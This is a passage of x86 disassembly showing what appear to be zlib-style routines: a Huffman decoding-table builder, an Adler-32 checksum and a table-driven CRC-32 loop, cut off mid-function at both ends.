   1d11c:	mov    eax,DWORD PTR [ebp+0x1c]
   1d11f:	push   ebx
   1d120:	mov    DWORD PTR [ebp-0x4c],eax
   1d123:	xor    eax,eax
   1d125:	push   esi
   1d126:	mov    esi,DWORD PTR [ebp+0x14]
   1d129:	movzx  ebx,ax
   1d12c:	push   edi
   1d12d:	mov    eax,ebx
   1d12f:	shl    ebx,0x10
   1d132:	push   0x8
   1d134:	or     eax,ebx
   1d136:	pop    ecx
   1d137:	lea    edi,[ebp-0x24]
   1d13a:	rep stos DWORD PTR es:[edi],eax
   1d13c:	xor    edi,edi
   1d13e:	xor    ecx,ecx
   1d140:	mov    DWORD PTR [ebp-0x90],edx
   1d146:	cmp    DWORD PTR [ebp+0x10],edi
   1d149:	jbe    0x1d15f
   1d14b:	mov    eax,DWORD PTR [ebp-0x7c]
   1d14e:	movzx  eax,WORD PTR [eax+ecx*2]
   1d152:	lea    eax,[ebp+eax*2-0x24]
   1d156:	inc    WORD PTR [eax]
   1d159:	inc    ecx
   1d15a:	cmp    ecx,DWORD PTR [ebp+0x10]
   1d15d:	jb     0x1d14b
   1d15f:	mov    ecx,DWORD PTR [edx]
   1d161:	push   0xf
   1d163:	pop    eax
   1d164:	mov    DWORD PTR [ebp-0x54],ecx
   1d167:	mov    DWORD PTR [ebp-0x60],eax
   1d16a:	cmp    WORD PTR [ebp+eax*2-0x24],di
   1d16f:	jne    0x1d17a
   1d171:	dec    eax
   1d172:	mov    DWORD PTR [ebp-0x60],eax
   1d175:	cmp    eax,0x1
   1d178:	jae    0x1d16a
   1d17a:	cmp    ecx,eax
   1d17c:	jbe    0x1d181
   1d17e:	mov    DWORD PTR [ebp-0x54],eax
   1d181:	cmp    eax,edi
   1d183:	jne    0x1d1af
   1d185:	mov    ecx,DWORD PTR [esi]
   1d187:	xor    eax,eax
   1d189:	mov    BYTE PTR [ebp-0x48],0x40
   1d18d:	mov    BYTE PTR [ebp-0x47],0x1
   1d191:	mov    WORD PTR [ebp-0x46],ax
   1d195:	mov    eax,DWORD PTR [ebp-0x48]
   1d198:	mov    DWORD PTR [ecx],eax
   1d19a:	add    DWORD PTR [esi],0x4
   1d19d:	mov    ecx,DWORD PTR [esi]
   1d19f:	mov    DWORD PTR [ecx],eax
   1d1a1:	add    DWORD PTR [esi],0x4
   1d1a4:	mov    DWORD PTR [edx],0x1
   1d1aa:	jmp    0x1d4eb
   1d1af:	xor    ecx,ecx
   1d1b1:	inc    ecx
   1d1b2:	mov    edx,ecx
   1d1b4:	cmp    WORD PTR [ebp+edx*2-0x24],di
   1d1b9:	jne    0x1d1c1
   1d1bb:	inc    edx
   1d1bc:	cmp    edx,0xf
   1d1bf:	jbe    0x1d1b4
   1d1c1:	cmp    DWORD PTR [ebp-0x54],edx
   1d1c4:	jae    0x1d1c9
   1d1c6:	mov    DWORD PTR [ebp-0x54],edx
   1d1c9:	mov    edi,ecx
   1d1cb:	movzx  ebx,WORD PTR [ebp+ecx*2-0x24]
   1d1d0:	add    edi,edi
   1d1d2:	sub    edi,ebx
   1d1d4:	js     0x1d260
   1d1da:	inc    ecx
   1d1db:	cmp    ecx,0xf
   1d1de:	jbe    0x1d1cb
   1d1e0:	xor    ebx,ebx
   1d1e2:	cmp    edi,ebx
   1d1e4:	jle    0x1d1f0
   1d1e6:	cmp    DWORD PTR [ebp+0x8],ebx
   1d1e9:	je     0x1d260
   1d1eb:	cmp    eax,0x1
   1d1ee:	jne    0x1d260
   1d1f0:	xor    eax,eax
   1d1f2:	push   0x2
   1d1f4:	mov    WORD PTR [ebp-0x42],ax
   1d1f8:	pop    ecx
   1d1f9:	mov    ax,WORD PTR [ebp+ecx*1-0x44]
   1d1fe:	add    ax,WORD PTR [ebp+ecx*1-0x24]
   1d203:	inc    ecx
   1d204:	mov    WORD PTR [ebp+ecx*1-0x43],ax
   1d209:	inc    ecx
   1d20a:	cmp    ecx,0x1e
   1d20d:	jb     0x1d1f9
   1d20f:	mov    eax,DWORD PTR [ebp-0x4c]
   1d212:	xor    edi,edi
   1d214:	cmp    DWORD PTR [ebp+0x10],ebx
   1d217:	jbe    0x1d242
   1d219:	mov    ecx,DWORD PTR [ebp-0x7c]
   1d21c:	lea    ecx,[ecx+edi*2]
   1d21f:	cmp    WORD PTR [ecx],bx
   1d222:	je     0x1d23c
   1d224:	movzx  ebx,WORD PTR [ecx]
   1d227:	movzx  ebx,WORD PTR [ebp+ebx*2-0x44]
   1d22c:	mov    WORD PTR [eax+ebx*2],di
   1d230:	movzx  ecx,WORD PTR [ecx]
   1d233:	lea    ecx,[ebp+ecx*2-0x44]
   1d237:	inc    WORD PTR [ecx]
   1d23a:	xor    ebx,ebx
   1d23c:	inc    edi
   1d23d:	cmp    edi,DWORD PTR [ebp+0x10]
   1d240:	jb     0x1d219
   1d242:	mov    ecx,DWORD PTR [ebp+0x8]
   1d245:	sub    ecx,ebx
   1d247:	je     0x1d28a
   1d249:	dec    ecx
   1d24a:	je     0x1d268
   1d24c:	or     DWORD PTR [ebp-0x68],0xffffffff
   1d250:	mov    DWORD PTR [ebp-0x6c],0x7bf70
   1d257:	mov    DWORD PTR [ebp-0x78],0x7bfb0
   1d25e:	jmp    0x1d297
   1d260:	or     eax,0xffffffff
   1d263:	jmp    0x1d4ed
   1d268:	mov    ecx,0x202
   1d26d:	mov    edi,0x7bef0
   1d272:	sub    edi,ecx
   1d274:	mov    DWORD PTR [ebp-0x6c],edi
   1d277:	mov    edi,0x7bf30
   1d27c:	sub    edi,ecx
   1d27e:	mov    DWORD PTR [ebp-0x78],edi
   1d281:	mov    DWORD PTR [ebp-0x68],0x100
   1d288:	jmp    0x1d297
   1d28a:	mov    DWORD PTR [ebp-0x78],eax
   1d28d:	mov    DWORD PTR [ebp-0x6c],eax
   1d290:	mov    DWORD PTR [ebp-0x68],0x13
   1d297:	mov    ecx,DWORD PTR [ebp-0x54]
   1d29a:	or     DWORD PTR [ebp-0x74],0xffffffff
   1d29e:	mov    edi,DWORD PTR [esi]
   1d2a0:	mov    eax,edx
   1d2a2:	xor    edx,edx
   1d2a4:	inc    edx
   1d2a5:	shl    edx,cl
   1d2a7:	cmp    DWORD PTR [ebp+0x8],0x1
   1d2ab:	mov    DWORD PTR [ebp-0x5c],ebx
   1d2ae:	mov    DWORD PTR [ebp-0x84],eax
   1d2b4:	lea    ecx,[edx-0x1]
   1d2b7:	mov    DWORD PTR [ebp-0x50],ebx
   1d2ba:	mov    DWORD PTR [ebp-0x80],edx
   1d2bd:	mov    DWORD PTR [ebp-0x64],edx
   1d2c0:	mov    DWORD PTR [ebp-0x88],ecx
   1d2c6:	jne    0x1d2d8
   1d2c8:	cmp    edx,0x5b0
   1d2ce:	jb     0x1d2d8
   1d2d0:	xor    eax,eax
   1d2d2:	inc    eax
   1d2d3:	jmp    0x1d4ed
   1d2d8:	mov    ecx,DWORD PTR [ebp-0x4c]
   1d2db:	mov    DWORD PTR [ebp-0x58],ecx
   1d2de:	mov    cl,al
   1d2e0:	sub    cl,BYTE PTR [ebp-0x50]
   1d2e3:	mov    BYTE PTR [ebp-0x47],cl
   1d2e6:	mov    ecx,DWORD PTR [ebp-0x58]
   1d2e9:	movzx  edx,WORD PTR [ecx]
   1d2ec:	movzx  ecx,dx
   1d2ef:	cmp    ecx,DWORD PTR [ebp-0x68]
   1d2f2:	jge    0x1d2fe
   1d2f4:	mov    BYTE PTR [ebp-0x48],0x0
   1d2f8:	mov    WORD PTR [ebp-0x46],dx
   1d2fc:	jmp    0x1d324
   1d2fe:	jle    0x1d31a
   1d300:	mov    ecx,DWORD PTR [ebp-0x58]
   1d303:	movzx  ecx,WORD PTR [ecx]
   1d306:	mov    edx,DWORD PTR [ebp-0x78]
   1d309:	add    ecx,ecx
   1d30b:	mov    dl,BYTE PTR [ecx+edx*1]
   1d30e:	mov    BYTE PTR [ebp-0x48],dl
   1d311:	mov    edx,DWORD PTR [ebp-0x6c]
   1d314:	mov    cx,WORD PTR [ecx+edx*1]
   1d318:	jmp    0x1d320
   1d31a:	mov    BYTE PTR [ebp-0x48],0x60
   1d31e:	xor    ecx,ecx
   1d320:	mov    WORD PTR [ebp-0x46],cx
   1d324:	xor    edx,edx
   1d326:	mov    ecx,eax
   1d328:	sub    ecx,DWORD PTR [ebp-0x50]
   1d32b:	inc    edx
   1d32c:	shl    edx,cl
   1d32e:	mov    ecx,DWORD PTR [ebp-0x80]
   1d331:	mov    DWORD PTR [ebp-0x4c],ecx
   1d334:	mov    DWORD PTR [ebp-0x70],ecx
   1d337:	mov    ecx,DWORD PTR [ebp-0x50]
   1d33a:	shr    ebx,cl
   1d33c:	add    ebx,DWORD PTR [ebp-0x4c]
   1d33f:	lea    ecx,[edi+ebx*4]
   1d342:	sub    DWORD PTR [ebp-0x4c],edx
   1d345:	mov    ebx,edx
   1d347:	shl    ebx,0x2
   1d34a:	sub    ecx,ebx
   1d34c:	cmp    DWORD PTR [ebp-0x4c],0x0
   1d350:	mov    ebx,DWORD PTR [ebp-0x48]
   1d353:	mov    DWORD PTR [ecx],ebx
   1d355:	jne    0x1d342
   1d357:	xor    edx,edx
   1d359:	lea    ecx,[eax-0x1]
   1d35c:	inc    edx
   1d35d:	shl    edx,cl
   1d35f:	mov    ecx,DWORD PTR [ebp-0x5c]
   1d362:	jmp    0x1d366
   1d364:	shr    edx,1
   1d366:	test   ecx,edx
   1d368:	jne    0x1d364
   1d36a:	test   edx,edx
   1d36c:	je     0x1d377
   1d36e:	lea    ebx,[edx-0x1]
   1d371:	and    ebx,ecx
   1d373:	add    ebx,edx
   1d375:	jmp    0x1d379
   1d377:	xor    ebx,ebx
   1d379:	add    DWORD PTR [ebp-0x58],0x2
   1d37d:	lea    ecx,[ebp+eax*2-0x24]
   1d381:	mov    edx,0xffff
   1d386:	add    WORD PTR [ecx],dx
   1d389:	movzx  ecx,WORD PTR [ecx]
   1d38c:	mov    DWORD PTR [ebp-0x5c],ebx
   1d38f:	test   cx,cx
   1d392:	jne    0x1d3b0
   1d394:	cmp    eax,DWORD PTR [ebp-0x60]
   1d397:	je     0x1d473
   1d39d:	mov    eax,DWORD PTR [ebp-0x58]
   1d3a0:	movzx  eax,WORD PTR [eax]
   1d3a3:	mov    ecx,DWORD PTR [ebp-0x7c]
   1d3a6:	movzx  eax,WORD PTR [ecx+eax*2]
   1d3aa:	mov    DWORD PTR [ebp-0x84],eax
   1d3b0:	mov    edx,DWORD PTR [ebp-0x54]
   1d3b3:	cmp    eax,edx
   1d3b5:	jbe    0x1d2de
   1d3bb:	mov    ecx,DWORD PTR [ebp-0x88]
   1d3c1:	and    ecx,ebx
   1d3c3:	mov    DWORD PTR [ebp-0x8c],ecx
   1d3c9:	cmp    ecx,DWORD PTR [ebp-0x74]
   1d3cc:	je     0x1d2de
   1d3d2:	cmp    DWORD PTR [ebp-0x50],0x0
   1d3d6:	jne    0x1d3db
   1d3d8:	mov    DWORD PTR [ebp-0x50],edx
   1d3db:	mov    ecx,DWORD PTR [ebp-0x70]
   1d3de:	lea    edi,[edi+ecx*4]
   1d3e1:	mov    ecx,eax
   1d3e3:	mov    eax,DWORD PTR [ebp-0x50]
   1d3e6:	xor    edx,edx
   1d3e8:	sub    ecx,eax
   1d3ea:	inc    edx
   1d3eb:	add    eax,ecx
   1d3ed:	shl    edx,cl
   1d3ef:	cmp    eax,DWORD PTR [ebp-0x60]
   1d3f2:	jae    0x1d41c
   1d3f4:	mov    DWORD PTR [ebp-0x4c],eax
   1d3f7:	lea    eax,[ebp+eax*2-0x24]
   1d3fb:	jmp    0x1d400
   1d3fd:	mov    eax,DWORD PTR [ebp-0x70]
   1d400:	movzx  ebx,WORD PTR [eax]
   1d403:	sub    edx,ebx
   1d405:	test   edx,edx
   1d407:	jle    0x1d41c
   1d409:	inc    ecx
   1d40a:	inc    DWORD PTR [ebp-0x4c]
   1d40d:	inc    eax
   1d40e:	inc    eax
   1d40f:	mov    DWORD PTR [ebp-0x70],eax
   1d412:	mov    eax,DWORD PTR [ebp-0x4c]
   1d415:	add    edx,edx
   1d417:	cmp    eax,DWORD PTR [ebp-0x60]
   1d41a:	jb     0x1d3fd
   1d41c:	xor    eax,eax
   1d41e:	inc    eax
   1d41f:	mov    edx,eax
   1d421:	shl    edx,cl
   1d423:	add    DWORD PTR [ebp-0x64],edx
   1d426:	mov    DWORD PTR [ebp-0x80],edx
   1d429:	cmp    DWORD PTR [ebp+0x8],eax
   1d42c:	jne    0x1d43b
   1d42e:	cmp    DWORD PTR [ebp-0x64],0x5b0
   1d435:	jae    0x1d4ed
   1d43b:	mov    eax,DWORD PTR [ebp-0x8c]
   1d441:	mov    ebx,DWORD PTR [ebp-0x5c]
   1d444:	mov    edx,eax
   1d446:	mov    DWORD PTR [ebp-0x74],eax
   1d449:	mov    eax,DWORD PTR [esi]
   1d44b:	shl    edx,0x2
   1d44e:	mov    BYTE PTR [edx+eax*1],cl
   1d451:	mov    eax,DWORD PTR [esi]
   1d453:	mov    cl,BYTE PTR [ebp-0x54]
   1d456:	mov    BYTE PTR [edx+eax*1+0x1],cl
   1d45a:	mov    eax,DWORD PTR [esi]
   1d45c:	mov    ecx,edi
   1d45e:	sub    ecx,eax
   1d460:	sar    ecx,0x2
   1d463:	mov    WORD PTR [edx+eax*1+0x2],cx
   1d468:	mov    eax,DWORD PTR [ebp-0x84]
   1d46e:	jmp    0x1d2de
   1d473:	mov    cl,al
   1d475:	sub    cl,BYTE PTR [ebp-0x50]
   1d478:	mov    BYTE PTR [ebp-0x48],0x40
   1d47c:	mov    BYTE PTR [ebp-0x47],cl
   1d47f:	xor    ecx,ecx
   1d481:	mov    WORD PTR [ebp-0x46],cx
   1d485:	jmp    0x1d4d4
   1d487:	cmp    DWORD PTR [ebp-0x50],0x0
   1d48b:	je     0x1d4a6
   1d48d:	mov    ecx,DWORD PTR [ebp-0x88]
   1d493:	and    ecx,ebx
   1d495:	cmp    ecx,DWORD PTR [ebp-0x74]
   1d498:	je     0x1d4a6
   1d49a:	mov    eax,DWORD PTR [ebp-0x54]
   1d49d:	and    DWORD PTR [ebp-0x50],0x0
   1d4a1:	mov    edi,DWORD PTR [esi]
   1d4a3:	mov    BYTE PTR [ebp-0x47],al
   1d4a6:	mov    ecx,DWORD PTR [ebp-0x50]
   1d4a9:	mov    edx,ebx
   1d4ab:	shr    edx,cl
   1d4ad:	mov    ecx,DWORD PTR [ebp-0x48]
   1d4b0:	mov    DWORD PTR [edi+edx*4],ecx
   1d4b3:	xor    edx,edx
   1d4b5:	lea    ecx,[eax-0x1]
   1d4b8:	inc    edx
   1d4b9:	shl    edx,cl
   1d4bb:	jmp    0x1d4bf
   1d4bd:	shr    edx,1
   1d4bf:	test   ebx,edx
   1d4c1:	jne    0x1d4bd
   1d4c3:	test   edx,edx
   1d4c5:	je     0x1d4d2
   1d4c7:	lea    ecx,[edx-0x1]
   1d4ca:	and    ecx,ebx
   1d4cc:	add    ecx,edx
   1d4ce:	mov    ebx,ecx
   1d4d0:	jmp    0x1d4d4
   1d4d2:	xor    ebx,ebx
   1d4d4:	test   ebx,ebx
   1d4d6:	jne    0x1d487
   1d4d8:	mov    eax,DWORD PTR [ebp-0x64]
   1d4db:	mov    ecx,DWORD PTR [ebp-0x54]
   1d4de:	shl    eax,0x2
   1d4e1:	add    DWORD PTR [esi],eax
   1d4e3:	mov    eax,DWORD PTR [ebp-0x90]
   1d4e9:	mov    DWORD PTR [eax],ecx
   1d4eb:	xor    eax,eax
   1d4ed:	mov    ecx,DWORD PTR [ebp-0x4]
   1d4f0:	pop    edi
   1d4f1:	pop    esi
   1d4f2:	xor    ecx,ebp
   1d4f4:	pop    ebx
   1d4f5:	call   0x1da15
   1d4fa:	leave  
   1d4fb:	ret    0x18
   1d4fe:	int3   
   1d4ff:	int3   
   1d500:	int3   
   1d501:	int3   
   1d502:	int3   
   1d503:	int3   
   1d504:	mov    edi,edi
   1d506:	push   ebp
   1d507:	mov    ebp,esp
   1d509:	push   ebx
   1d50a:	mov    ebx,DWORD PTR [ebp+0x10]
   1d50d:	push   esi
   1d50e:	mov    esi,DWORD PTR [ebp+0x8]
   1d511:	push   edi
   1d512:	xor    eax,eax
   1d514:	mov    edi,esi
   1d516:	inc    eax
   1d517:	shr    edi,0x10
   1d51a:	and    esi,0xffff
   1d520:	cmp    ebx,eax
   1d522:	jne    0x1d548
   1d524:	mov    eax,DWORD PTR [ebp+0xc]
   1d527:	movzx  eax,BYTE PTR [eax]
   1d52a:	add    esi,eax
   1d52c:	mov    eax,0xfff1
   1d531:	cmp    esi,eax
   1d533:	jb     0x1d537
   1d535:	sub    esi,eax
   1d537:	add    edi,esi
   1d539:	cmp    edi,eax
   1d53b:	jb     0x1d71a
   1d541:	sub    edi,eax
   1d543:	jmp    0x1d71a
   1d548:	mov    ecx,DWORD PTR [ebp+0xc]
   1d54b:	test   ecx,ecx
   1d54d:	je     0x1d721
   1d553:	cmp    ebx,0x10
   1d556:	jb     0x1d6dd
   1d55c:	cmp    ebx,0x15b0
   1d562:	jb     0x1d630
   1d568:	mov    eax,ebx
   1d56a:	mov    ebx,0x15b0
   1d56f:	xor    edx,edx
   1d571:	div    ebx
   1d573:	mov    ebx,DWORD PTR [ebp+0x10]
   1d576:	mov    DWORD PTR [ebp+0xc],eax
   1d579:	sub    ebx,0x15b0
   1d57f:	mov    eax,0x15b
   1d584:	movzx  edx,BYTE PTR [ecx]
   1d587:	add    esi,edx
   1d589:	movzx  edx,BYTE PTR [ecx+0x1]
   1d58d:	add    edi,esi
   1d58f:	add    esi,edx
   1d591:	movzx  edx,BYTE PTR [ecx+0x2]
   1d595:	add    edi,esi
   1d597:	add    esi,edx
   1d599:	movzx  edx,BYTE PTR [ecx+0x3]
   1d59d:	add    edi,esi
   1d59f:	add    esi,edx
   1d5a1:	movzx  edx,BYTE PTR [ecx+0x4]
   1d5a5:	add    edi,esi
   1d5a7:	add    esi,edx
   1d5a9:	movzx  edx,BYTE PTR [ecx+0x5]
   1d5ad:	add    edi,esi
   1d5af:	add    esi,edx
   1d5b1:	movzx  edx,BYTE PTR [ecx+0x6]
   1d5b5:	add    edi,esi
   1d5b7:	add    esi,edx
   1d5b9:	movzx  edx,BYTE PTR [ecx+0x7]
   1d5bd:	add    edi,esi
   1d5bf:	add    esi,edx
   1d5c1:	movzx  edx,BYTE PTR [ecx+0x8]
   1d5c5:	add    edi,esi
   1d5c7:	add    esi,edx
   1d5c9:	movzx  edx,BYTE PTR [ecx+0x9]
   1d5cd:	add    edi,esi
   1d5cf:	add    esi,edx
   1d5d1:	movzx  edx,BYTE PTR [ecx+0xa]
   1d5d5:	add    edi,esi
   1d5d7:	add    esi,edx
   1d5d9:	movzx  edx,BYTE PTR [ecx+0xb]
   1d5dd:	add    edi,esi
   1d5df:	add    esi,edx
   1d5e1:	movzx  edx,BYTE PTR [ecx+0xc]
   1d5e5:	add    edi,esi
   1d5e7:	add    esi,edx
   1d5e9:	movzx  edx,BYTE PTR [ecx+0xd]
   1d5ed:	add    edi,esi
   1d5ef:	add    esi,edx
   1d5f1:	movzx  edx,BYTE PTR [ecx+0xe]
   1d5f5:	add    edi,esi
   1d5f7:	add    esi,edx
   1d5f9:	movzx  edx,BYTE PTR [ecx+0xf]
   1d5fd:	add    edi,esi
   1d5ff:	add    esi,edx
   1d601:	add    edi,esi
   1d603:	add    ecx,0x10
   1d606:	dec    eax
   1d607:	jne    0x1d584
   1d60d:	mov    eax,esi
   1d60f:	xor    edx,edx
   1d611:	mov    esi,0xfff1
   1d616:	div    esi
   1d618:	mov    eax,edi
   1d61a:	mov    edi,0xfff1
   1d61f:	mov    esi,edx
   1d621:	xor    edx,edx
   1d623:	div    edi
   1d625:	dec    DWORD PTR [ebp+0xc]
   1d628:	mov    edi,edx
   1d62a:	jne    0x1d579
   1d630:	test   ebx,ebx
   1d632:	je     0x1d71a
   1d638:	cmp    ebx,0x10
   1d63b:	jb     0x1d6ff
   1d641:	mov    eax,ebx
   1d643:	shr    eax,0x4
   1d646:	movzx  edx,BYTE PTR [ecx]
   1d649:	add    esi,edx
   1d64b:	movzx  edx,BYTE PTR [ecx+0x1]
   1d64f:	add    edi,esi
   1d651:	add    esi,edx
   1d653:	movzx  edx,BYTE PTR [ecx+0x2]
   1d657:	add    edi,esi
   1d659:	add    esi,edx
   1d65b:	movzx  edx,BYTE PTR [ecx+0x3]
   1d65f:	add    edi,esi
   1d661:	add    esi,edx
   1d663:	movzx  edx,BYTE PTR [ecx+0x4]
   1d667:	add    edi,esi
   1d669:	add    esi,edx
   1d66b:	movzx  edx,BYTE PTR [ecx+0x5]
   1d66f:	add    edi,esi
   1d671:	add    esi,edx
   1d673:	movzx  edx,BYTE PTR [ecx+0x6]
   1d677:	add    edi,esi
   1d679:	add    esi,edx
   1d67b:	movzx  edx,BYTE PTR [ecx+0x7]
   1d67f:	add    edi,esi
   1d681:	add    esi,edx
   1d683:	movzx  edx,BYTE PTR [ecx+0x8]
   1d687:	add    edi,esi
   1d689:	add    esi,edx
   1d68b:	movzx  edx,BYTE PTR [ecx+0x9]
   1d68f:	add    edi,esi
   1d691:	add    esi,edx
   1d693:	movzx  edx,BYTE PTR [ecx+0xa]
   1d697:	add    edi,esi
   1d699:	add    esi,edx
   1d69b:	movzx  edx,BYTE PTR [ecx+0xb]
   1d69f:	add    edi,esi
   1d6a1:	add    esi,edx
   1d6a3:	movzx  edx,BYTE PTR [ecx+0xc]
   1d6a7:	add    edi,esi
   1d6a9:	add    esi,edx
   1d6ab:	movzx  edx,BYTE PTR [ecx+0xd]
   1d6af:	add    edi,esi
   1d6b1:	add    esi,edx
   1d6b3:	movzx  edx,BYTE PTR [ecx+0xe]
   1d6b7:	add    edi,esi
   1d6b9:	add    esi,edx
   1d6bb:	movzx  edx,BYTE PTR [ecx+0xf]
   1d6bf:	add    edi,esi
   1d6c1:	add    esi,edx
   1d6c3:	sub    ebx,0x10
   1d6c6:	add    edi,esi
   1d6c8:	add    ecx,0x10
   1d6cb:	dec    eax
   1d6cc:	jne    0x1d646
   1d6d2:	jmp    0x1d6ff
   1d6d4:	movzx  eax,BYTE PTR [ecx]
   1d6d7:	dec    ebx
   1d6d8:	add    esi,eax
   1d6da:	inc    ecx
   1d6db:	add    edi,esi
   1d6dd:	test   ebx,ebx
   1d6df:	jne    0x1d6d4
   1d6e1:	mov    ecx,0xfff1
   1d6e6:	cmp    esi,ecx
   1d6e8:	jb     0x1d6ec
   1d6ea:	sub    esi,ecx
   1d6ec:	mov    eax,edi
   1d6ee:	xor    edx,edx
   1d6f0:	div    ecx
   1d6f2:	mov    eax,edx
   1d6f4:	jmp    0x1d71c
   1d6f6:	movzx  eax,BYTE PTR [ecx]
   1d6f9:	dec    ebx
   1d6fa:	add    esi,eax
   1d6fc:	inc    ecx
   1d6fd:	add    edi,esi
   1d6ff:	test   ebx,ebx
   1d701:	jne    0x1d6f6
   1d703:	mov    eax,esi
   1d705:	mov    ecx,0xfff1
   1d70a:	xor    edx,edx
   1d70c:	mov    esi,ecx
   1d70e:	div    esi
   1d710:	mov    eax,edi
   1d712:	mov    esi,edx
   1d714:	xor    edx,edx
   1d716:	div    ecx
   1d718:	mov    edi,edx
   1d71a:	mov    eax,edi
   1d71c:	shl    eax,0x10
   1d71f:	or     eax,esi
   1d721:	pop    edi
   1d722:	pop    esi
   1d723:	pop    ebx
   1d724:	pop    ebp
   1d725:	ret    0xc
   1d728:	int3   
   1d729:	int3   
   1d72a:	int3   
   1d72b:	int3   
   1d72c:	int3   
   1d72d:	int3   
   1d72e:	mov    edi,edi
   1d730:	push   ebp
   1d731:	mov    ebp,esp
   1d733:	push   ecx
   1d734:	cmp    DWORD PTR [ebp+0x8],0x0
   1d738:	push   esi
   1d739:	not    eax
   1d73b:	mov    ecx,0xff
   1d740:	je     0x1d75e
   1d742:	test   dl,0x3
   1d745:	je     0x1d75e
   1d747:	movzx  esi,BYTE PTR [edx]
   1d74a:	xor    esi,eax
   1d74c:	and    esi,ecx
   1d74e:	shr    eax,0x8
   1d751:	xor    eax,DWORD PTR [esi*4+0x7bff0]
   1d758:	inc    edx
   1d759:	dec    DWORD PTR [ebp+0x8]
   1d75c:	jne    0x1d742
   1d75e:	cmp    DWORD PTR [ebp+0x8],0x20
   1d762:	push   ebx
   1d763:	push   edi
   1d764:	push   0x4
   1d766:	mov    esi,edx
   1d768:	pop    edi
   1d769:	jb     0x1d92d
   1d76f:	mov    edx,DWORD PTR [ebp+0x8]
   1d772:	shr    edx,0x5
   1d775:	mov    DWORD PTR [ebp-0x4],edx
   1d778:	xor    eax,DWORD PTR [esi]
   1d77a:	add    esi,edi
   1d77c:	mov    edx,eax
   1d77e:	shr    edx,0x10
   1d781:	mov    ebx,eax
   1d783:	shr    ebx,0x8
   1d786:	and    edx,ecx
   1d788:	mov    edx,DWORD PTR [edx*4+0x7c3f0]
   1d78f:	and    ebx,ecx
   1d791:	xor    edx,DWORD PTR [ebx*4+0x7c7f0]
   1d798:	mov    ebx,eax
   1d79a:	shr    ebx,0x18
   1d79d:	xor    edx,DWORD PTR [ebx*4+0x7bff0]
   1d7a4:	and    eax,ecx
   1d7a6:	xor    edx,DWORD PTR [eax*4+0x7cbf0]
   1d7ad:	xor    edx,DWORD PTR [esi]
   1d7af:	add    esi,edi
   1d7b1:	mov    eax,edx
   1d7b3:	shr    eax,0x10
   1d7b6:	mov    ebx,edx
   1d7b8:	shr    ebx,0x8
   1d7bb:	and    eax,ecx
   1d7bd:	mov    eax,DWORD PTR [eax*4+0x7c3f0]
   1d7c4:	and    ebx,ecx
   1d7c6:	xor    eax,DWORD PTR [ebx*4+0x7c7f0]
   1d7cd:	mov    ebx,edx
   1d7cf:	shr    ebx,0x18
   1d7d2:	xor    eax,DWORD PTR [ebx*4+0x7bff0]
   1d7d9:	and    edx,ecx
   1d7db:	xor    eax,DWORD PTR [edx*4+0x7cbf0]
   1d7e2:	xor    eax,DWORD PTR [esi]
   1d7e4:	add    esi,edi
   1d7e6:	mov    edx,eax
   1d7e8:	shr    edx,0x10
   1d7eb:	mov    ebx,eax
   1d7ed:	and    edx,ecx
   1d7ef:	mov    edx,DWORD PTR [edx*4+0x7c3f0]
   1d7f6:	shr    ebx,0x8
   1d7f9:	and    ebx,ecx
   1d7fb:	xor    edx,DWORD PTR [ebx*4+0x7c7f0]
   1d802:	mov    ebx,eax
   1d804:	shr    ebx,0x18
   1d807:	xor    edx,DWORD PTR [ebx*4+0x7bff0]
   1d80e:	and    eax,ecx
   1d810:	xor    edx,DWORD PTR [eax*4+0x7cbf0]
   1d817:	xor    edx,DWORD PTR [esi]
   1d819:	add    esi,edi
   1d81b:	mov    eax,edx
   1d81d:	shr    eax,0x10
   1d820:	mov    ebx,edx
   1d822:	shr    ebx,0x8
   1d825:	and    eax,ecx
   1d827:	mov    eax,DWORD PTR [eax*4+0x7c3f0]
   1d82e:	and    ebx,ecx
   1d830:	xor    eax,DWORD PTR [ebx*4+0x7c7f0]
   1d837:	mov    ebx,edx
   1d839:	shr    ebx,0x18
   1d83c:	xor    eax,DWORD PTR [ebx*4+0x7bff0]
   1d843:	and    edx,ecx
   1d845:	xor    eax,DWORD PTR [edx*4+0x7cbf0]
   1d84c:	xor    eax,DWORD PTR [esi]
   1d84e:	add    esi,edi
   1d850:	mov    edx,eax
   1d852:	shr    edx,0x10
   1d855:	mov    ebx,eax
   1d857:	and    edx,ecx
   1d859:	mov    edx,DWORD PTR [edx*4+0x7c3f0]
   1d860:	shr    ebx,0x8
   1d863:	and    ebx,ecx
   1d865:	xor    edx,DWORD PTR [ebx*4+0x7c7f0]
   1d86c:	mov    ebx,eax
   1d86e:	shr    ebx,0x18
   1d871:	xor    edx,DWORD PTR [ebx*4+0x7bff0]
   1d878:	and    eax,ecx
   1d87a:	xor    edx,DWORD PTR [eax*4+0x7cbf0]
   1d881:	xor    edx,DWORD PTR [esi]
   1d883:	add    esi,edi
   1d885:	mov    eax,edx
   1d887:	shr    eax,0x10
   1d88a:	and    eax,ecx
   1d88c:	mov    ebx,edx
   1d88e:	mov    eax,DWORD PTR [eax*4+0x7c3f0]
   1d895:	shr    ebx,0x8
   1d898:	and    ebx,ecx
   1d89a:	xor    eax,DWORD PTR [ebx*4+0x7c7f0]
   1d8a1:	mov    ebx,edx
   1d8a3:	shr    ebx,0x18
   1d8a6:	xor    eax,DWORD PTR [ebx*4+0x7bff0]
   1d8ad:	and    edx,ecx
   1d8af:	xor    eax,DWORD PTR [edx*4+0x7cbf0]
   1d8b6:	sub    DWORD PTR [ebp+0x8],0x20
   1d8ba:	xor    eax,DWORD PTR [esi]
   1d8bc:	add    esi,edi
   1d8be:	mov    edx,eax
   1d8c0:	mov    ebx,eax
   1d8c2:	shr    edx,0x10
   1d8c5:	shr    ebx,0x8
   1d8c8:	and    edx,ecx
   1d8ca:	mov    edx,DWORD PTR [edx*4+0x7c3f0]
   1d8d1:	and    ebx,ecx
   1d8d3:	xor    edx,DWORD PTR [ebx*4+0x7c7f0]
   1d8da:	mov    ebx,eax
   1d8dc:	shr    ebx,0x18
   1d8df:	xor    edx,DWORD PTR [ebx*4+0x7bff0]
   1d8e6:	and    eax,ecx
   1d8e8:	xor    edx,DWORD PTR [eax*4+0x7cbf0]
   1d8ef:	xor    edx,DWORD PTR [esi]
   1d8f1:	add    esi,edi
   1d8f3:	mov    eax,edx
   1d8f5:	shr    eax,0x10
   1d8f8:	and    eax,ecx
   1d8fa:	mov    eax,DWORD PTR [eax*4+0x7c3f0]
   1d901:	mov    ebx,edx
   1d903:	shr    ebx,0x8
   1d906:	and    ebx,ecx
   1d908:	xor    eax,DWORD PTR [ebx*4+0x7c7f0]
   1d90f:	mov    ebx,edx
